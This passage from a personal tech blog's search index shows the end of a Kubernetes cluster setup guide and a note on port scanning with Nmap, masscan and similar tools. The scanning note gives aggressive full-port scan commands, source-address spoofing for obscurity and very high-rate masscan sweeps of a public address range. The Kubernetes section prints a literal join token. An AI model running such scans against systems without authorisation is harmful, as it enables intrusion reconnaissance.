$(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p><code>--pod-network-cidr</code>:</p><ul><li>flannel: <code>10.244.0.0/16</code></li><li>weave: <code>10.32.0.0/12</code></li><li>calico: <code>192.168.0.0/16</code></li></ul><p>apply CNI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># flannel</span><br><span class="line">kubectl apply -f &lt;https://raw.githubusercontent.com/flannel-io/flannel/master/Documentation/kube-flannel.yml&gt;</span><br><span class="line"></span><br><span class="line"># weave</span><br><span class="line">kubectl apply -f &quot;https://cloud.weave.works/k8s/net?k8s-version=$(kubectl version | base64 | tr -d &#x27;\n&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"># calico</span><br><span class="line">kubectl apply -f https://docs.projectcalico.org/manifests/calico-typha.yaml</span><br></pre></td></tr></table></figure><h2 id="K8S-join-nodes">K8S join (nodes)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo kubeadm join 10.0.0.145:6443 --token rehcz9.67jf80xbe86oj9j1 \\</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:c4275404b872ce55ccb2a9e7df48a9b8d40010c1bc35e4ec19278a449de9bad5</span><br></pre></td></tr></table></figure><h2 id="deployement-yml">deployement.yml</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f deployement.yml</span><br><span class="line"></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: [this is a name]-deployment</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: [this is a name]</span><br><span class="line">  replicas: 1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: [this is a name]</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: [this is a name]</span><br><span class="line">        image: [this is docker image]</span><br><span class="line">        resources:</span><br><span class="line">          limits:</span><br><span class="line">            cpu: &quot;0.5&quot;</span><br><span class="line">            memory: &quot;512Mi&quot;</span><br><span class="line">          requests:</span><br><span class="line">            cpu: &quot;0.5&quot;</span><br><span class="line">            memory: &quot;512Mi&quot;</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 5000</span><br></pre></td></tr></table></figure><h2 id="service-yml">service.yml</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f service.yml</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: [this is a name]-service</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort</span><br><span class="line">  selector:</span><br><span class="line">    app: [this is a name]</span><br><span class="line">  ports:</span><br><span class="line">  - protocol: TCP</span><br><span class="line">    port: 5000</span><br><span class="line">    targetPort: 5000</span><br><span class="line">    nodePort: 30007</span><br></pre></td></tr></table></figure><h2 id="Check-Docker-and-Kubelet-Status">Check Docker and Kubelet Status</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl status docker</span><br><span class="line">sudo systemctl status kubelet</span><br></pre></td></tr></table></figure><h2 id="Monitor-K8S-Resources">Monitor K8S Resources</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watch kubectl get deployment,svc,pods,nodes -o wide --all-namespaces</span><br></pre></td></tr></table></figure><h1>Command to Revert</h1><h2 id="K8S">K8S</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo kubeadm reset</span><br><span class="line">sudo apt-get purge kubeadm kubectl kubelet kubernetes-cni kube*</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">sudo rm -rf ~/.kube</span><br><span class="line">sudo rm -rf /etc/kubernetes</span><br><span class="line">sudo rm -rf /etc/cni/net.d</span><br><span class="line">sudo rm -rf /var/lib/kubelet</span><br><span class="line">sudo rm -rf /var/lib/etcd</span><br></pre></td></tr></table></figure><h2 id="Docker">Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker system prune -a</span><br><span class="line">sudo apt remove docker.io</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h1>!!! Pitfalls !!!</h1><ol><li><p><strong>Everything is well configured; I can <code>curl localhost:30033</code> from nodes or <code>curl [node_ip]:30033</code> from the controller, but not <code>curl localhost:30033</code> from the controller.</strong></p><p>This is because the iptables and security lists block the communication between <code>kube-proxies</code>. Refers to the Pre-Configuration part.</p></li><li><p><strong>Timeout while joining controller from nodes.</strong></p><p>This is highly due to improper configurations on security lists. We have to open TCP port 6443 for both ways.</p></li><li><p><strong>Pods show <code>running</code>, but the <code>READY</code> state is <code>0/1</code> for the DNS pod.</strong></p><p>This happens when I first implement flannel as my OCI, I finally figured out this issue is also related to iptables. The traffics are DROPPED by rules.</p></li><li><p><strong><code>dial tcp 127.0.0.1:10248: connect: connection refused</code> when I run <code>kubeadm init</code>.</strong></p><p>This is because Docker <code>cgroup</code> is not <code>systemd</code>.</p></li><li><p><strong><code>failed to get config map: Unauthorised</code> while joining nodes to the controller.</strong></p><p>The token is invalid, run <code>sudo kubeadm token create --print-join-command</code> on the controller to create a new one.</p></li><li><p><strong><code>Port 10250 is in use</code></strong></p><p>This is because <code>kubelet</code> is using this port, run <code>sudo systemctl restart kubelet</code> or <code>sudo kubeadm reset</code></p></li></ol><h1>References</h1><ol><li><a href="https://faun.pub/free-ha-multi-architecture-kubernetes-cluster-from-oracle-c66b8ce7cc37">https://faun.pub/free-ha-multi-architecture-kubernetes-cluster-from-oracle-c66b8ce7cc37</a></li><li><a href="https://medium.com/platformer-blog/running-a-kubernetes-cluster-on-ubuntu-with-calico-9e372fb9175e">https://medium.com/platformer-blog/running-a-kubernetes-cluster-on-ubuntu-with-calico-9e372fb9175e</a></li><li><a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/</a></li><li><a href="https://github.com/flannel-io/flannel">https://github.com/flannel-io/flannel</a></li><li><a href="https://stackoverflow.com/a/60725618">https://stackoverflow.com/a/60725618</a></li><li><a href="https://kubernetes.io/docs/reference/ports-and-protocols/">https://kubernetes.io/docs/reference/ports-and-protocols/</a></li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/">https://kubernetes.io/docs/concepts/services-networking/service/</a></li><li><a href="https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/">https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/</a></li><li><a href="https://docs.docker.com/engine/reference/commandline/dockerd/">https://docs.docker.com/engine/reference/commandline/dockerd/</a></li><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES">http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES</a></li><li><a href="https://blog.csdn.net/haveanybody/article/details/86494063">https://blog.csdn.net/haveanybody/article/details/86494063</a></li><li><a href="https://stackoverflow.com/a/58491408">https://stackoverflow.com/a/58491408</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OCI </tag>
            
            <tag> Docker </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> NodePort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描</title>
      <link href="/2021/08/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/08/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1>Nmap</h1><blockquote><p><a href="https://nmap.org/">NMAP</a>（Network Mapper）is a free and open source utility for network discovery and security auditing.</p></blockquote><h2 id="Scan-Types">Scan Types</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-sT: TCP</span><br><span class="line">-sS: SYN</span><br><span class="line">-sA: ACK</span><br><span class="line">-sU: UDP</span><br><span class="line">-sR: RPC</span><br><span class="line">-sP: ICMP</span><br><span class="line">-sn: Disable port scan, usually for ping scanning</span><br></pre></td></tr></table></figure><p>I usually use these commands, but the bad sides are <strong>time consuming</strong> and <strong>huge amount of requests</strong>.</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -Pn -vv -p- -A -T4 -O &lt;target&gt;</span><br><span class="line">nmap -sS -sC -sV -oA &lt;NAME&gt;.tcp &lt;target&gt; -v</span><br><span class="line">nmap -sU -sS -sC -sV -oA &lt;NAME&gt;.udp &lt;target&gt; -v</span><br></pre></td></tr></table></figure><h2 id="Output">Output</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-oN &lt;File&gt;</span><br><span class="line">-oX &lt;XML File&gt;</span><br><span class="line">-oG &lt;filespec&gt;</span><br></pre></td></tr></table></figure><p><a href="http://www.unspecific.com/nmap-oG-output/">Grep Reference</a></p><h2 id="T-Options"><code>-T</code> Options</h2><ul><li><p><code>-T0</code>: One port at a time.</p></li><li><p><code>-T1</code>: 15 seconds RTT.</p></li><li><p><code>-T2</code>: 0.4 seconds between each requests. Comparing with default option, it uses less bandwidthes and makes less pressures to the servers.</p></li><li><p><code>-T3</code>: Default options, this includes thread scanning.</p></li><li><p><code>-T4</code>: If the server is capable, it increases the scanning speed accrodingly.</p></li><li><p><code>-T5</code>: It sacrifies the accuracy in exchange of the maximum scanning speed.</p></li></ul><h2 id="Tips">Tips</h2><ul><li><code>--host-timeout</code>: usually set to 18000</li><li><code>--scan-delay</code>: usually set to 1000</li><li><code>-S</code>: set source address for obsecurity</li><li>Output Beautify</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install xsltproc</span><br><span class="line">xsltproc -o ip.htm beautiful.xsl ip.xml</span><br></pre></td></tr></table></figure><h1><a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></h1><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">./nmapAutomator &lt;target&gt; All</span><br></pre></td></tr></table></figure><h1><a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autorecon &lt;IP&gt;/CIDR</span><br></pre></td></tr></table></figure><h1>Yujian</h1><p><a href="https://pan.baidu.com/share/init?surl=Uh-FWsXOUlVUM3ZOpRWoYQ">Yujian High Speed Port Scanner</a> (Code: czne).</p><p><strong>ATTENTION</strong>: default threading is too high.</p><h1><a href="https://github.com/robertdavidgraham/masscan">Masscan</a></h1><h2 id="Features">Features</h2><ul><li>The fastest scanner in the worlds. It is capable to scan all the ports in 3 minutes.</li><li>Comparing with Nmap, it is much faster. It uses <strong>asynchronous transmission</strong> and <strong>stateless scanning</strong>.</li><li>A complete TCP connection is not established. A <code>RST</code> packet will be sent once it receives a <code>SYN/ACK</code> packet. (Exception for <code>--banners</code> option)</li><li>Nmap needs to record the status of TCP/IP, and the TCP/IP connection that OS can handle at the same time is only up to about 1500.</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan --ping 28.41.0.0/16 --rate 1000000 # Ping scans for probing</span><br><span class="line">masscan -iL tmp_scanip_list.tmp -p1-65535 -Pn -v --randomize-hosts --banners -ox result.xml --rate 100000</span><br></pre></td></tr></table></figure><ul><li>It may encounter device interferences, so that there are too many port are open.</li></ul><h2 id="Advanced-Options">Advanced Options</h2><ul><li><code>--adapter-ip</code>: set the source IP address</li><li><code>--adapater-port</code>: set the source port</li><li><code>--adapter-mac</code>: set the source MAC address</li><li><code>--router-mac</code>: set the gateway MAC address</li><li><code>--exclude</code>: set IP blacklists to prevent from scanning</li><li><code>--excludefile</code>: set IP blacklists from a file</li><li><code>--includefile, -iL</code>: scan specific IPs from a file</li><li><code>--wait</code>: set wait time after each packet sent, default 10 seconds.</li></ul><h1>Online Port Scanning</h1><ul><li><a href="https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-online-nmap">Nmap UDP Scan</a></li><li><a href="https://pentest-tools.com/network-vulnerability-scanning/tcp-port-scanner-online-nmap">Nmap TCP Scan</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 主机安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> Nmap </tag>
            
            <tag> 御剑 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
